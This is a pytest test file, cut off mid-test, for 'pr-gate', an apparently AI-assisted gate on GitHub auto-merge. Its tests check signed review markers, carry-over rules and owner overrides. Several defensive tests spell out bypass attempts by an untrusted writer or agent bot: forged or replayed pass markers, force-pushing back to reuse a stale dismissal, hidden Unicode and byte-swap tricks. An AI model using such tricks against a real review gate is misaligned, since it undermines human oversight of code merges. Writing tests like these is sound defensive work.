"""pr-gate: the end-to-end decision flow (design steps 1-6) against a fake
GitHub layer and a fake model layer. No network."""
from __future__ import annotations

import _prgate  # noqa: F401

import io
import json

import pytest

from prgate import core, verdict
from prgate.github import GitHub, GitHubError, PullState, Review, TimelineEvent, TooLarge
from prgate.llm import Finding, PassResult

OWNER = "jonathan"
BOT = "github-actions[bot]"
HEAD = "1" * 40
OLD = "2" * 40
NEWER = "3" * 40
BASE_OID = "b" * 40
KEY = b"sk-ant-gate-key"
REPO = "jonathan/app"

DIFF = """\
diff --git a/src/app.py b/src/app.py
index 1111111..2222222 100644
--- a/src/app.py
+++ b/src/app.py
@@ -10,3 +10,4 @@ def main():
     a = 1
-    b = 2
+    b = 3
+    c = 4
     return a
"""


def dismissal(review_id, actor):
    return TimelineEvent("dismissed", review_id, actor)


def posted(review_id):
    return TimelineEvent("reviewed", review_id)


REWRITE = TimelineEvent("rewrite")


def shifted(diff, delta=40):
    return diff.replace("@@ -10,3 +10,4 @@", f"@@ -{10 + delta},3 +{10 + delta},4 @@")


class FakeGitHub:
    def __init__(self, diff=DIFF, head=HEAD, enabled_by=OWNER, auto_merge=True,
                 reviews=(), files=None, dismissals=(), base_ref="main", base_oid=BASE_OID,
                 timeline=None, base_files=None):
        self.state = PullState(head_sha=head, auto_merge=auto_merge, enabled_by=enabled_by,
                               base_ref=base_ref, base_oid=base_oid)
        self.compared: list[tuple[str, str]] = []
        self.diff_text = diff
        self._reviews = list(reviews)
        self.files = files or {}
        self.base_files = base_files or {}   # contents at base_oid; absent = 404
        self.posted: list[tuple[str, str, str]] = []
        self.dismissed: list[int] = []
        self.refuse_request_changes = False
        self.fetched: list[str] = []
        # Default timeline: every review posted, then the dismissals.
        self._timeline = (list(timeline) if timeline is not None else
                          [posted(r.id) for r in reviews] + list(dismissals))
        self.timeline_reads = 0

    def pull_state(self, number):
        return self.state

    def diff(self, base, head, limit):
        self.compared.append((base, head))
        data = self.diff_text.encode()
        if len(data) > limit:
            raise TooLarge("diff")
        return data

    def file_content(self, path, ref, limit):
        if ref == self.state.base_oid:
            if path not in self.base_files:
                raise GitHubError("file-content", 404)
            data = self.base_files[path]
            if isinstance(data, Exception):
                raise data
            if len(data) > limit:
                raise TooLarge("contents")
            return data
        self.fetched.append(path)
        data = self.files.get(path, b"x = 1\n")
        if len(data) > limit:
            raise TooLarge("contents")
        return data

    def reviews(self, number):
        return list(self._reviews)

    def timeline(self, number):
        self.timeline_reads += 1
        return list(self._timeline)

    def post_review(self, number, head, event, body):
        if event == "REQUEST_CHANGES" and self.refuse_request_changes:
            raise GitHubError("post-review", 422)
        self.posted.append((event, head, body))

    def dismiss_review(self, number, review_id, message):
        self.dismissed.append(review_id)


class FakeModel:
    def __init__(self, passes=None):
        self.calls = []
        self.passes = passes if passes is not None else [
            PassResult("monitor_a", "ok", suspicion=3),
            PassResult("monitor_b", "ok", suspicion=4),
            PassResult("review", "ok"),
        ]

    def __call__(self, diff_text, contents, scrutiny, omitted):
        self.calls.append({"diff": diff_text, "contents": contents,
                           "scrutiny": scrutiny, "omitted": omitted})
        return self.passes


def cfg(**kw):
    base = dict(owner=OWNER, model="claude-opus-5-5", effort="high", threshold=25, exceptions=[],
                marker_key=KEY)
    base.update(kw)
    return core.Config(**base)


def event(action="auto_merge_enabled", head=HEAD, attempt=1):
    return core.Event(action=action, number=7, head_sha=head, repo=REPO,
                      default_branch="main", run_attempt=attempt)


def run(gh, model=None, action="auto_merge_enabled", head=HEAD, attempt=1, **kw):
    model = model if model is not None else FakeModel()
    out = core.run(event(action, head, attempt), cfg(**kw), gh, model)
    return out, model


def gate_review(verdict_, head, own_hash, state=None, rid=100, login=BOT):
    state = state or ("CHANGES_REQUESTED" if verdict_ == "block" else "COMMENTED")
    body = verdict.render_marker(KEY, verdict=verdict_, repo=REPO, number=7, head=head,
                                 own_hash=own_hash) + "\n\nbody"
    return Review(id=rid, login=login, state=state, commit_id=head, body=body)


def own_hash_of(diff):
    gh = FakeGitHub(diff=diff)
    return core.gather(gh, BASE_OID, event()).own_hash


# ----- step 1: owner intent and freshness ---------------------------------------

def test_no_auto_merge_fails_without_review_or_model():
    gh = FakeGitHub(auto_merge=False, enabled_by=None)
    out, model = run(gh)
    assert out.exit_code == 1 and "enable auto-merge" in out.message
    assert gh.posted == [] and model.calls == []


def test_auto_merge_enabled_by_someone_else_fails():
    gh = FakeGitHub(enabled_by="agent-bot[bot]")
    out, model = run(gh)
    assert out.exit_code == 1 and f"enabled by {OWNER}" in out.message
    assert gh.posted == [] and model.calls == []


def test_owner_login_compare_is_case_insensitive():
    out, _ = run(FakeGitHub(enabled_by="Jonathan"))
    assert out.exit_code == 0


def test_stale_head_fails():
    gh = FakeGitHub(head=OLD)
    out, model = run(gh)
    assert out.exit_code == 1 and "stale" in out.message
    assert model.calls == []


def test_unsupported_action_fails():
    out, model = run(FakeGitHub(), action="opened")
    assert out.exit_code == 1 and model.calls == []


@pytest.mark.parametrize("action", core.ACTIONS)
def test_without_a_key_nothing_is_posted_or_trusted(action):
    # No key: no marker could be signed or verified.
    gh = FakeGitHub(reviews=[gate_review("pass", OLD, own_hash_of(DIFF), rid=5),
                             gate_review("block", HEAD, own_hash_of(DIFF), rid=6)],
                    dismissals=[dismissal(6, OWNER)])
    out, model = run(gh, action=action, marker_key=b"", attempt=2)
    assert out.exit_code == 1 and "anthropic-api-key" in out.message
    assert gh.posted == [] and model.calls == []


def test_the_key_is_not_in_the_config_repr():
    assert KEY.decode() not in repr(cfg())


# ----- full review ---------------------------------------------------------------

def test_clean_full_review_posts_a_pass_comment_with_hash():
    gh = FakeGitHub()
    out, model = run(gh)
    assert out.exit_code == 0
    [(ev, head, body)] = gh.posted
    assert (ev, head) == ("COMMENT", HEAD)
    assert verdict.verify_marker(body, KEY, repo=REPO, number=7) == ("pass", HEAD, own_hash_of(DIFF))
    assert len(model.calls) == 1


def test_suspicious_review_requests_changes_and_fails():
    gh = FakeGitHub()
    model = FakeModel([PassResult("monitor_a", "ok", suspicion=80)])
    out, _ = run(gh, model)
    assert out.exit_code == 1
    [(ev, _, body)] = gh.posted
    assert ev == "REQUEST_CHANGES" and verdict.parse_marker(body)[0] == "block"


def test_request_changes_refused_falls_back_to_comment():
    gh = FakeGitHub()
    gh.refuse_request_changes = True
    out, _ = run(gh, FakeModel([PassResult("monitor_a", "ok", suspicion=80)]))
    assert out.exit_code == 1
    [(ev, _, body)] = gh.posted
    assert ev == "COMMENT" and verdict.parse_marker(body)[0] == "block"


def test_a_block_posted_as_a_comment_says_it_cannot_be_dismissed():
    # GitHub cannot dismiss a COMMENT review: "dismiss to override" would
    # leave the owner stuck.
    gh = FakeGitHub()
    gh.refuse_request_changes = True
    out, _ = run(gh, FakeModel([PassResult("monitor_a", "ok", suspicion=80)]))
    [(_, _, body)] = gh.posted
    assert "the owner dismisses this review" not in body
    for text in (body, out.message):
        assert "cannot be dismissed" in text and "ruleset bypass" in text


def test_a_request_changes_block_still_says_dismiss_to_override():
    gh = FakeGitHub()
    run(gh, FakeModel([PassResult("monitor_a", "ok", suspicion=80)]))
    [(ev, _, body)] = gh.posted
    assert ev == "REQUEST_CHANGES" and "the owner dismisses this review" in body
    assert "cannot be dismissed" not in body


def test_incomplete_model_answer_blocks_with_a_review():
    gh = FakeGitHub()
    out, _ = run(gh, FakeModel([PassResult("monitor_a", "incomplete", "refusal")]))
    assert out.exit_code == 1 and gh.posted[0][0] == "REQUEST_CHANGES"


def test_infra_failure_fails_without_a_review_and_says_how_to_retry():
    # A re-run never asks the model again, so the retry is an owner toggle.
    gh = FakeGitHub()
    out, _ = run(gh, FakeModel([PassResult("monitor_a", "ok", suspicion=1),
                                PassResult("review", "infra", "api-timeout")]))
    assert out.exit_code == 1 and gh.posted == []
    assert "api-timeout" in out.message and "re-enable auto-merge" in out.message


@pytest.mark.parametrize("reason", ["api-status-400", "api-status-401", "api-status-404",
                                    "api-status-413"])
def test_a_persistent_model_4xx_is_a_config_error_not_a_retry(reason):
    # A model-name typo or a too-long prompt fails the same way every time.
    gh = FakeGitHub()
    out, _ = run(gh, FakeModel([PassResult("monitor_a", "ok", suspicion=1),
                                PassResult("review", "infra", reason)]))
    assert out.exit_code == 1 and gh.posted == []
    assert out.message.startswith("config:") and reason in out.message
    assert "model" in out.message and "will not help" in out.message
    assert core.RETRY not in out.message


@pytest.mark.parametrize("reason", ["api-status-408", "api-status-409", "api-rate-limit",
                                    "api-status-429", "api-status-500", "api-status-529",
                                    "api-timeout", "api-connection", "api-other",
                                    "api-status-other"])
def test_transient_model_failures_stay_infra_with_a_retry_hint(reason):
    gh = FakeGitHub()
    out, _ = run(gh, FakeModel([PassResult("review", "infra", reason)]))
    assert out.exit_code == 1 and gh.posted == []
    assert out.message.startswith("infra:") and core.RETRY in out.message


def test_pass_dismisses_only_the_gates_own_earlier_blocks():
    reviews = [
        gate_review("block", OLD, "0" * 64, rid=1),
        Review(id=2, login=BOT, state="CHANGES_REQUESTED", commit_id=OLD, body="no marker"),
        Review(id=3, login=OWNER, state="CHANGES_REQUESTED", commit_id=OLD, body=""),
        gate_review("pass", OLD, "0" * 64, rid=4),
    ]
    gh = FakeGitHub(reviews=reviews)
    out, _ = run(gh)
    assert out.exit_code == 0 and gh.dismissed == [1]


class NoDismiss(FakeGitHub):
    def dismiss_review(self, number, review_id, message):
        raise GitHubError("dismiss-review", 403)


def _undismissable(mode):
    """A pass in `mode` while an earlier gate block (review 1, older head)
    cannot be dismissed."""
    old_block = gate_review("block", OLD, "0" * 64, rid=1)
    h = own_hash_of(DIFF)
    if mode == "full":
        return run(NoDismiss(reviews=[old_block]))
    if mode == "carry-over":
        return run(NoDismiss(diff=shifted(DIFF), reviews=[old_block,
                             gate_review("pass", OLD, h, rid=5)]), action="synchronize")
    head_block = gate_review("block", HEAD, h, rid=2, state="DISMISSED")
    return run(NoDismiss(reviews=[old_block, head_block], dismissals=[dismissal(2, OWNER)]),
               attempt=2)


@pytest.mark.parametrize("mode", ["full", "carry-over", "owner-override"])
def test_an_undismissable_earlier_block_never_asks_for_a_manual_dismissal(mode):
    # Dismissing a gate review IS the override: a hand dismissal of an old
    # head's block would count if that head ever came back.
    out, _ = _undismissable(mode)
    assert out.exit_code == 0 and out.message.startswith(f"passed ({mode})")
    assert "could not be dismissed" in out.message
    assert "by hand" not in out.message.replace("never dismiss a gate review by hand", "")
    assert "never dismiss a gate review by hand" in out.message


@pytest.mark.parametrize("mode,retry", [
    ("full", "a re-run of this check would fail"),
    ("carry-over", "re-run this check"),
    ("owner-override", "re-run this check"),
])
def test_an_undismissable_earlier_block_says_how_to_retry(mode, retry):
    out, _ = _undismissable(mode)
    assert retry in out.message


def test_model_still_runs_when_a_deterministic_check_already_blocks():
    # Otherwise an owner override of a path hit would merge unreviewed code.
    diff = DIFF.replace("src/app.py", ".github/workflows/ci.yml")
    gh = FakeGitHub(diff=diff)
    out, model = run(gh)
    assert out.exit_code == 1 and len(model.calls) == 1
    assert "sensitive-path" in gh.posted[0][2]


def test_diff_too_large_for_the_model_blocks_without_a_model_call(monkeypatch):
    monkeypatch.setattr(core, "DIFF_LLM_CAP", 50)
    gh = FakeGitHub()
    out, model = run(gh)
    assert out.exit_code == 1 and model.calls == []
    assert "too large" in gh.posted[0][2]


def test_diff_beyond_the_hard_cap_fails_without_review(monkeypatch):
    monkeypatch.setattr(core, "DIFF_HARD_CAP", 50)
    gh = FakeGitHub()
    out, model = run(gh)
    assert out.exit_code == 1 and gh.posted == [] and model.calls == []


def test_github_error_fails_closed_without_body():
    class Broken(FakeGitHub):
        def reviews(self, number):
            raise GitHubError("list-reviews", 502)

    out, model = run(Broken())
    assert out.exit_code == 1 and "list-reviews" in out.message and model.calls == []


def test_unparseable_diff_fails_closed():
    out, model = run(FakeGitHub(diff="garbage\n"))
    assert out.exit_code == 1 and model.calls == []


def test_monitor_b_gets_text_contents_but_not_binaries_or_deletions():
    diff = DIFF + (
        "diff --git a/logo.png b/logo.png\nnew file mode 100644\n"
        "Binary files /dev/null and b/logo.png differ\n"
        "diff --git a/gone.py b/gone.py\ndeleted file mode 100644\n--- a/gone.py\n+++ /dev/null\n"
        "@@ -1 +0,0 @@\n-x\n"
    )
    gh = FakeGitHub(diff=diff, files={"logo.png": b"\x89PNG\r\n\x1a\n", "src/app.py": b"a = 1\n"})
    out, model = run(gh)
    contents = model.calls[0]["contents"]
    assert contents == {"src/app.py": "a = 1\n"}
    assert out.exit_code == 1  # the binary blocks


def test_a_bumped_submodule_blocks_and_is_not_fetched_as_a_file():
    diff = DIFF + ("diff --git a/sub b/sub\nindex 1234567..89abcde 160000\n--- a/sub\n"
                   "+++ b/sub\n@@ -1 +1 @@\n-Subproject commit " + "1" * 40 + "\n"
                   "+Subproject commit " + "2" * 40 + "\n")
    gh = FakeGitHub(diff=diff)
    out, model = run(gh)
    assert out.exit_code == 1 and "submodule" in gh.posted[0][2]
    assert gh.fetched == ["src/app.py"]


def test_a_path_with_a_space_is_fetched_without_gits_trailing_tab():
    diff = DIFF.replace("src/app.py", "src/my app.py").replace(
        "--- a/src/my app.py\n", "--- a/src/my app.py\t\n").replace(
        "+++ b/src/my app.py\n", "+++ b/src/my app.py\t\n")
    gh = FakeGitHub(diff=diff)
    out, model = run(gh)
    assert out.exit_code == 0 and gh.fetched == ["src/my app.py"]


def test_an_unparseable_quoted_path_is_a_parse_failure_not_infra():
    diff = DIFF.replace("+++ b/src/app.py", '+++ "b/src/\\377.py"')
    gh = FakeGitHub(diff=diff)
    out, model = run(gh)
    assert out.exit_code == 1 and "could not parse the diff" in out.message
    assert gh.fetched == [] and model.calls == [] and gh.posted == []


def test_contents_budget_omission_reaches_the_model(monkeypatch):
    monkeypatch.setattr(core, "CONTENTS_BUDGET", 5)
    gh = FakeGitHub(files={"src/app.py": b"0123456789"})
    _, model = run(gh)
    assert model.calls[0]["contents"] == {} and model.calls[0]["omitted"] == ["src/app.py"]


# ----- synchronize: fail, except a pure base merge -------------------------------

def test_synchronize_without_a_previous_pass_fails_without_model_call():
    gh = FakeGitHub()
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 1 and "re-enable auto-merge" in out.message
    assert model.calls == [] and gh.posted == []


def test_synchronize_after_a_base_merge_carries_the_pass_over():
    passed = gate_review("pass", OLD, own_hash_of(DIFF), rid=5)
    gh = FakeGitHub(diff=shifted(DIFF), reviews=[passed])
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 0 and model.calls == []
    [(ev, head, body)] = gh.posted
    assert ev == "COMMENT" and head == HEAD and "carried over" in body
    assert verdict.verify_marker(body, KEY, repo=REPO, number=7) == ("pass", HEAD, own_hash_of(DIFF))


def test_synchronize_with_an_extra_edit_fails():
    passed = gate_review("pass", OLD, own_hash_of(DIFF), rid=5)
    gh = FakeGitHub(diff=shifted(DIFF).replace("+    c = 4", "+    c = 5"), reviews=[passed])
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 1 and model.calls == [] and gh.posted == []


def test_synchronize_ignores_pass_markers_not_written_by_the_gate():
    forged = gate_review("pass", OLD, own_hash_of(DIFF), rid=5, login="agent-bot[bot]")
    gh = FakeGitHub(diff=shifted(DIFF), reviews=[forged])
    out, _ = run(gh, action="synchronize")
    assert out.exit_code == 1


def test_synchronize_uses_the_latest_gate_pass():
    older = gate_review("pass", OLD, own_hash_of(DIFF), rid=5)
    newer = gate_review("pass", OLD, "f" * 64, rid=6)
    gh = FakeGitHub(diff=shifted(DIFF), reviews=[older, newer])
    out, _ = run(gh, action="synchronize")
    assert out.exit_code == 1


def test_synchronize_does_not_carry_a_pass_over_a_later_block_of_the_same_changes():
    # Owner re-requested review at an unchanged head, that roll blocked; a
    # base merge must not resurrect the older pass.
    h = own_hash_of(DIFF)
    reviews = [gate_review("pass", OLD, h, rid=5), gate_review("block", OLD, h, rid=6)]
    gh = FakeGitHub(diff=shifted(DIFF), reviews=reviews)
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 1 and "re-enable auto-merge" in out.message
    assert model.calls == [] and gh.posted == []



def test_after_an_override_two_base_updates_in_a_row_carry_over():
    # block -> owner dismisses -> override pass; then "Update branch" twice.
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", OLD, h, rid=5, state="DISMISSED"),
               gate_review("pass", OLD, h, rid=7)]
    gh = FakeGitHub(diff=shifted(DIFF), reviews=reviews, dismissals=[dismissal(5, OWNER)])
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 0 and model.calls == []
    [(_, _, carried)] = gh.posted
    assert "carried over" in carried
    newer = Review(id=8, login=BOT, state="COMMENTED", commit_id=HEAD, body=carried)
    gh2 = FakeGitHub(diff=shifted(DIFF, 80), head=NEWER, reviews=reviews + [newer])
    out2, model2 = run(gh2, action="synchronize", head=NEWER)
    assert out2.exit_code == 0 and model2.calls == []
    assert "carried over" in gh2.posted[0][2]


def test_the_newest_marker_decides_even_after_an_earlier_block_of_the_same_changes():
    # Markers are signed, so a pass can't be minted; a replayed real pass
    # only re-asserts content a model (or the owner) passed.
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", OLD, h, rid=6), gate_review("pass", OLD, h, rid=7)]
    gh = FakeGitHub(diff=shifted(DIFF), reviews=reviews)
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 0 and model.calls == []


def test_the_newest_marker_is_by_review_id_not_api_order():
    # The API returns the newer block (id 12) before the older pass (id 5).
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", OLD, h, rid=12), gate_review("pass", OLD, h, rid=5)]
    gh = FakeGitHub(diff=shifted(DIFF), reviews=reviews)
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 1 and gh.posted == [] and model.calls == []


def test_reopened_without_a_pass_fails_without_a_model_call():
    # Close/reopen must not be a free reroll while auto-merge stays on.
    gh = FakeGitHub()
    out, model = run(gh, action="reopened")
    assert out.exit_code == 1 and "re-enable auto-merge" in out.message
    assert model.calls == [] and gh.posted == []


def test_reopened_after_a_pass_of_the_same_changes_carries_over():
    gh = FakeGitHub(reviews=[gate_review("pass", HEAD, own_hash_of(DIFF), rid=5)])
    out, model = run(gh, action="reopened")
    assert out.exit_code == 0 and model.calls == []
    assert "carried over" in gh.posted[0][2]


# ----- forged markers: another workflow's github-actions[bot] token -----------------

def forged_bodies(verdict_, head, own_hash):
    """Marker text any workflow in the repo can post as github-actions[bot],
    without the gate's key."""
    def with_mac_of(key=KEY, repo=REPO, number=7, v=verdict_, h=own_hash):
        mac = verdict.marker_mac(key, verdict=v, repo=repo, number=number, head=head, own_hash=h)
        return verdict.MARKER.format(verdict=verdict_, head=head, hash=own_hash, mac=mac)

    real_mac = verdict.marker_mac(KEY, verdict=verdict_, repo=REPO, number=7, head=head,
                                  own_hash=own_hash)
    one_digit_off = ("0" if real_mac[0] != "0" else "1") + real_mac[1:]
    return [
        f"<!-- pr-gate:v1 verdict={verdict_} head={head} hash={own_hash} -->\n\nbody",
        verdict.render_marker(None, verdict=verdict_, repo=REPO, number=7, head=head,
                              own_hash=own_hash),                          # unsigned
        with_mac_of(key=b"some-other-key"),
        with_mac_of(number=8),                                             # another PR
        with_mac_of(repo="jonathan/other"),                                # another repo
        with_mac_of(h="f" * 64),                                           # other changes
        with_mac_of(v="block" if verdict_ == "pass" else "pass"),          # other verdict
        verdict.MARKER.format(verdict=verdict_, head=head, hash=own_hash, mac=one_digit_off),
    ]


def forged(verdict_, head, own_hash, body, rid=100):
    state = "CHANGES_REQUESTED" if verdict_ == "block" else "COMMENTED"
    return Review(id=rid, login=BOT, state=state, commit_id=head, body=body)


@pytest.mark.parametrize("body", forged_bodies("pass", OLD, own_hash_of(DIFF)))
def test_a_forged_bot_pass_does_not_carry_over(body):
    gh = FakeGitHub(diff=shifted(DIFF), reviews=[forged("pass", OLD, own_hash_of(DIFF), body)])
    out, model = run(gh, action="synchronize")
    assert out.exit_code == 1 and gh.posted == [] and model.calls == []


@pytest.mark.parametrize("body", forged_bodies("block", HEAD, "0" * 64))
def test_a_forged_block_marker_in_a_comment_does_not_block_the_head(body):
    review = Review(id=100, login=BOT, state="COMMENTED", commit_id=HEAD, body=body)
    gh = FakeGitHub(reviews=[review])
    out, model = run(gh)
    assert len(model.calls) == 1 and out.exit_code == 0



@pytest.mark.parametrize("body", forged_bodies("block", HEAD, "0" * 64))
def test_an_unverified_bot_request_changes_is_not_a_gate_block(body):
    # Only a verified block guards the head. A forged or edited one gets the
    # owner's fresh review (attempt 1); a re-run never reaches the model.
    gh = FakeGitHub(reviews=[forged("block", HEAD, "0" * 64, body)],
                    dismissals=[dismissal(100, OWNER)])
    out, model = run(gh)
    assert len(model.calls) == 1 and out.exit_code == 0
    gh2 = FakeGitHub(reviews=[forged("block", HEAD, "0" * 64, body)],
                     dismissals=[dismissal(100, OWNER)])
    out2, model2 = run(gh2, attempt=2)
    assert out2.exit_code == 1 and model2.calls == [] and gh2.posted == []
    # An edited block costs the owner a fresh roll only if they toggle
    # blindly: the message sends them to the PR first, and offers no
    # dismissal (there is no verified block to dismiss).
    assert "no verified gate block" in out2.message and "look at the PR" in out2.message
    assert "dismiss" not in out2.message



@pytest.mark.parametrize("body", forged_bodies("block", OLD, "0" * 64))
def test_a_pass_does_not_dismiss_a_forged_bot_block(body):
    gh = FakeGitHub(reviews=[forged("block", OLD, "0" * 64, body, rid=1),
                             gate_review("block", OLD, "0" * 64, rid=2)])
    out, _ = run(gh)
    assert out.exit_code == 0 and gh.dismissed == [2]


def test_carry_over_still_runs_the_always_on_checks():
    # Same own changes can't newly contain hidden Unicode, but the check
    # must not depend on that reasoning.
    diff = DIFF.replace("+    c = 4", '+    c = "\u200b"')
    passed = gate_review("pass", OLD, own_hash_of(diff), rid=5)
    gh = FakeGitHub(diff=shifted(diff), reviews=[passed])
    out, _ = run(gh, action="synchronize")
    assert out.exit_code == 1 and gh.posted[0][0] == "REQUEST_CHANGES"


def _hash_of_bytes(diff_bytes, files=None):
    files = files or {}
    return core.gather_from(diff_bytes, lambda p: files.get(p, b""), lambda f: None).own_hash


def test_diffs_differing_only_in_invalid_utf8_hash_differently():
    # Decoded with errors="replace", both bytes become U+FFFD: a push
    # swapping one for the other would ride a carried-over pass.
    a = DIFF.encode().replace(b"c = 4", b"c = '\xff'")
    b = DIFF.encode().replace(b"c = 4", b"c = '\xfe'")
    assert _hash_of_bytes(a) != _hash_of_bytes(b)


def test_invalid_utf8_in_a_binary_path_still_hashes_its_content():
    diff = (b"diff --git a/x\xff.png b/x\xff.png\nnew file mode 100644\n"
            b"Binary files /dev/null and b/x\xff.png differ\n")
    path = diff.decode("utf-8", errors="replace").split("\n")[0].split(" b/")[1]
    assert (_hash_of_bytes(diff, {path: b"\x89PNG\r\n\x1a\nA"})
            != _hash_of_bytes(diff, {path: b"\x89PNG\r\n\x1a\nB"}))


@pytest.mark.parametrize("diff,expected", [
    # Own-changes hashes of valid UTF-8 diffs as computed before the
    # surrogateescape change: carry-over of existing passes must not break.
    (DIFF, "a3ea9398ea44d9e3baad90f573a4e39c5bd3095724c8383d78c4165c949f009d"),
    (DIFF.replace("c = 4", 'c = "caf\u00e9 \u4e2d \u2705"'),
     "78a565352875188065f5db37b53ccfb8e2f626359a9062280f479bbb03bf8664"),
])
def test_valid_utf8_diffs_hash_as_before(diff, expected):
    assert _hash_of_bytes(diff.encode()) == expected


def test_the_model_still_gets_replacement_decoded_text():
    diff = DIFF.encode().replace(b"c = 4", b"c = '\xff'")
    g = core.gather_from(diff, lambda p: b"", lambda f: None)
    assert "\ufffd" in g.diff_text and "\udcff" not in g.diff_text
    assert all("\udcff" not in t for f in g.files for _, t in f.added)


def test_binary_content_change_breaks_carry_over():
    diff = DIFF + ("diff --git a/logo.png b/logo.png\nnew file mode 100644\n"
                   "Binary files /dev/null and b/logo.png differ\n")
    gh1 = FakeGitHub(diff=diff, files={"logo.png": b"\x89PNG\r\n\x1a\nAAAA"})
    h1 = core.gather(gh1, BASE_OID, event()).own_hash
    passed = gate_review("pass", OLD, h1, rid=5)
    gh2 = FakeGitHub(diff=shifted(diff), reviews=[passed], files={"logo.png": b"\x89PNG\r\n\x1a\nBBBB"})
    out, _ = run(gh2, action="synchronize")
    assert out.exit_code == 1 and gh2.posted == []


# ----- step 2: the base must be the default branch -----------------------------------

@pytest.mark.parametrize("action", core.ACTIONS)
def test_a_pr_into_another_branch_fails_without_review_or_model(action):
    # The live base, not the event payload's: a re-run replays the payload.
    h = own_hash_of(DIFF)
    gh = FakeGitHub(reviews=[gate_review("pass", OLD, h, rid=5)], base_ref="release")
    out, model = run(gh, action=action)
    assert out.exit_code == 1 and "only reviews PRs into main" in out.message
    assert gh.posted == [] and model.calls == []


def test_the_diff_is_taken_against_the_live_base_commit_not_a_name():
    # A writer can push a tag named like the base branch; a name could
    # resolve to it and make the reviewed diff attacker-chosen.
    gh = FakeGitHub()
    out, _ = run(gh)
    assert out.exit_code == 0 and gh.compared == [(BASE_OID, HEAD)]


# ----- step 4: owner override by dismissing the gate's review ------------------------

def blocked(**kw):
    """A verified gate block on HEAD (review 1), as the fresh review left it."""
    kw.setdefault("reviews", [gate_review("block", HEAD, own_hash_of(kw.get("diff", DIFF)),
                                          rid=1, state="DISMISSED")])
    return FakeGitHub(**kw)


def test_owner_dismissal_then_rerun_is_an_override_pass_without_a_model_call():
    gh = blocked(dismissals=[dismissal(1, OWNER)])
    out, model = run(gh, attempt=2)
    assert out.exit_code == 0 and model.calls == []
    [(ev, _, body)] = gh.posted
    assert ev == "COMMENT" and "dismiss" in body.lower()
    assert verdict.verify_marker(body, KEY, repo=REPO, number=7) == ("pass", HEAD, own_hash_of(DIFF))
    assert out.message == "passed (owner-override)"


def test_owner_dismissal_compares_the_login_case_insensitively():
    out, model = run(blocked(dismissals=[dismissal(1, "Jonathan")]), attempt=2)
    assert out.exit_code == 0 and model.calls == []


def test_owner_dismissal_also_overrides_on_an_auto_merge_toggle():
    out, model = run(blocked(dismissals=[dismissal(1, OWNER)]), attempt=1)
    assert out.exit_code == 0 and model.calls == []


NEW_COMMIT = "push a new commit to the PR"


@pytest.mark.parametrize("dismissals", [
    ([], "CHANGES_REQUESTED"),
    ([dismissal(2, OWNER)], "CHANGES_REQUESTED"),         # some other review
    ([dismissal(1, BOT)], "DISMISSED"),                   # another workflow, or the gate itself
    ([dismissal(1, "agent-bot[bot]")], "DISMISSED"),
])
@pytest.mark.parametrize("attempt", [1, 2])
def test_without_the_owners_dismissal_a_blocked_head_stays_blocked(dismissals, attempt):
    dismissals, state = dismissals
    gh = blocked(dismissals=dismissals,
                 reviews=[gate_review("block", HEAD, own_hash_of(DIFF), rid=1, state=state)])
    out, model = run(gh, attempt=attempt)
    assert out.exit_code == 1 and model.calls == [] and gh.posted == []
    if state == "DISMISSED":  # the owner cannot dismiss it again
        assert "dismiss its review" not in out.message and NEW_COMMIT in out.message
    else:
        assert "jonathan must dismiss its review" in out.message


def test_an_already_dismissed_block_that_does_not_count_asks_for_a_new_commit():
    gh = blocked(timeline=[posted(1), dismissal(1, OWNER), REWRITE])
    out, _ = run(gh, attempt=2)
    assert out.message == (
        "the gate blocked this commit and its review is already dismissed, but that "
        "dismissal does not count: it was not by jonathan, or a force push or branch "
        "restore came after the block. A review cannot be dismissed twice: push a new "
        "commit to the PR, then disable and re-enable auto-merge for a fresh review")


def test_a_block_left_undismissed_still_says_the_owner_must_dismiss_it():
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", HEAD, h, rid=1, state="DISMISSED"),
               gate_review("block", HEAD, h, rid=5)]
    out, _ = run(FakeGitHub(reviews=reviews, timeline=[posted(1), dismissal(1, OWNER),
                                                        REWRITE, posted(5)]), attempt=2)
    assert "jonathan must dismiss its review" in out.message


def override_attempts(gh_factory):
    """Both ways to ask for an override: a re-run, and an owner toggle."""
    for attempt in (1, 2):
        gh = gh_factory()
        out, model = run(gh, attempt=attempt)
        yield out, model, gh


def test_a_stale_dismissal_is_not_an_override_after_a_force_push_back():
    # H blocked (1); clean H2 pushed and passed (2); owner dismisses the
    # stale block; the writer force-pushes back to H.
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", HEAD, h, rid=1, state="DISMISSED"),
               gate_review("pass", OLD, "f" * 64, rid=2)]
    tl = [posted(1), posted(2), dismissal(1, OWNER), REWRITE]
    for out, model, gh in override_attempts(lambda: FakeGitHub(reviews=reviews, timeline=tl)):
        assert out.exit_code == 1 and NEW_COMMIT in out.message
        assert model.calls == [] and gh.posted == []


def test_a_stale_dismissal_is_not_an_override_after_a_fast_forward_back():
    # H blocked (1); force-push back to its parent H2, which passes (2);
    # owner dismisses the stale block; the writer fast-forwards to H again.
    # That push leaves no event after the dismissal (its `committed` event
    # sorts at H's own, earlier, date), so the rewrite after the block was
    # posted is what must void the dismissal.
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", HEAD, h, rid=1, state="DISMISSED"),
               gate_review("pass", OLD, "f" * 64, rid=2)]
    tl = [posted(1), REWRITE, posted(2), dismissal(1, OWNER)]
    for out, model, gh in override_attempts(lambda: FakeGitHub(reviews=reviews, timeline=tl)):
        assert out.exit_code == 1 and NEW_COMMIT in out.message
        assert model.calls == [] and gh.posted == []


def test_a_dismissal_after_the_last_push_is_an_override():
    tl = [REWRITE, posted(1), dismissal(1, OWNER)]
    for out, model, _ in override_attempts(lambda: blocked(timeline=tl)):
        assert out.exit_code == 0 and model.calls == []
        assert out.message == "passed (owner-override)"


def test_a_fresh_block_after_a_rewrite_can_be_overridden():
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", HEAD, h, rid=1, state="DISMISSED"),
               gate_review("block", HEAD, h, rid=5, state="DISMISSED")]
